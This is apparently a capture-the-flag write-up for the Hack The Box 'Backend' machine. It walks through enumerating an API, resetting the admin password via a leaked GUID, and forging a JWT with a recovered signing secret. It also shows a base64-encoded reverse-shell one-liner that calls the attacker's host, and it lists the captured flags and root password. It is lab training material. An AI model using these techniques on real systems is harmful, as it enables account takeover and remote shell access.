IP: 10.10.11.161
# Enumeration
## Nmap
```bash
sudo nmap -sC -sV -oA nmap/backend 10.10.11.161

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    uvicorn
```

## Port 80
```json
{"msg":"UHC API Version 1.0"}
```

### Gobuster
/api endpoint.

which has a /v1 entry

Two more entries, admin and user.
## Admin
Just says not authenticated.

## User
providing /user/1
```json
{
  "guid": "36c2e94a-4271-4259-93bf-c96ad5948284",
  "email": "admin@htb.local",
  "date": null,
  "time_created": 1649533388111,
  "is_superuser": true,
  "id": 1
}

```

fuzzing the endpoint.
```bash
wfuzz -X POST -w /opt/SecLists/Discovery/Web-Content/common.txt -u http://10.10.11.161/api/v1/user/FUZZ --hc 404,405
```

Gives both login and signup

# Creating an account

## Signup
```
POST /api/v1/user/signup HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 58

{
	"email":"a@a.com",
	"password":"abc123"
}

```

Creates a valid user. (201)

## Login
Signing in
```
POST /api/v1/user/login HTTP/1.1
Host: 10.10.11.161
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 32
Content-Type: application/x-www-form-urlencoded

username=a@a.com&password=abc123
```

returns a JWT.
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc4NDc1MzE1LCJpYXQiOjE2Nzc3ODQxMTUsInN1YiI6IjIiLCJpc19zdXBlcnVzZXIiOmZhbHNlLCJndWlkIjoiOTdjMDdmNGMtZDAwNC00ZTRhLThkMTEtNjQwM2IyMmNkNjVmIn0.0M50YoCjIdjq3-Ukswg9_-FXWUe2j2LlRtyb9VIw4BA
```

# Logging in
Going to /docs and adding the jwt to the request. Also need to add it to the json request.

Once in the docs there is a PUT command for Get flag. Running this gives user.txt
```
curl -X 'PUT' \ 'http://10.10.11.161/api/v1/user/SecretFlagEndpoint' \ -H 'accept: application/json' | jq .

ddad201da5bc65442904f166163c91f0
```

# Priv esc
We can change a users password by grabbing the guid.
```bash
curl -X 'GET' 'http://10.10.11.161/api/v1/user/1' -H 'accept: application/json'|jq .
```

```
36c2e94a-4271-4259-93bf-c96ad5948284
```

Then to change the password.
```bash
curl -X 'POST'  'http://10.10.11.161/api/v1/user/updatepass'  -H 'accept: application/json'  -H 'Content-Type: application/json'  -d '{ "guid": "36c2e94a-4271-4259-93bf-c96ad5948284", "password": "abc123" }'
```

Check with the admin checker.

We can now read files. Still need to get debug value in the JWT so we can run commands.

Get the environ variables.
  ```json
  "file": "APP_MODULE=app.main:app\u0000PWD=/home/htb/uhc\u0000LOGNAME=htb\u0000PORT=80\u0000HOME=/home/htb\u0000LANG=C.UTF-8\u0000VIRTUAL_ENV=/home/htb/uhc/.venv\u0000INVOCATION_ID=61040a9e8558464aa01a78971acb9a08\u0000HOST=0.0.0.0\u0000USER=htb\u0000SHLVL=0\u0000PS1=(.venv) \u0000JOURNAL_STREAM=9:18422\u0000PATH=/home/htb/uhc/.venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000OLDPWD=/\u0000"
```

backend is at `/home/htb/uhc/app/main.py`

Downloading the file there is an import from a config file at `app/core/config.py` which includes a JWT secret of 
```json
SuperSecretSigningKey-HTB
```

Signing a forged JWT with the debug value we can now use the exec endpoint.

JWT:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjc4NjQ4NTA3LCJpYXQiOjE2Nzc5NTczMDcsInN1YiI6IjEiLCJpc19zdXBlcnVzZXIiOnRydWUsImRlYnVnIjp0cnVlLCJndWlkIjoiMzZjMmU5NGEtNDI3MS00MjU5LTkzYmYtYzk2YWQ1OTQ4Mjg0In0.C2jUk8xmHo6whSRjqtQPNzRSEix-u5YwfLJNPiEnU0U
```

b64 encode a payload then url encode it and get a shell.
```
echo ' bash -i >& /dev/tcp/10.10.14.34/9001 0>&1' | base64 -w 0
```

Then add to request.
```
echo 'IGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzQvOTAwMSAwPiYxCg==' |base64 -d|bash
```

Then encode all chars and send the req.

# Foothold
On the box there is a auth.log file which has the admin's password. `Tr0ub4dor&3`

Using su and cat root.txt
```
5fba4ff2992711327c73b7878a87f88e
```

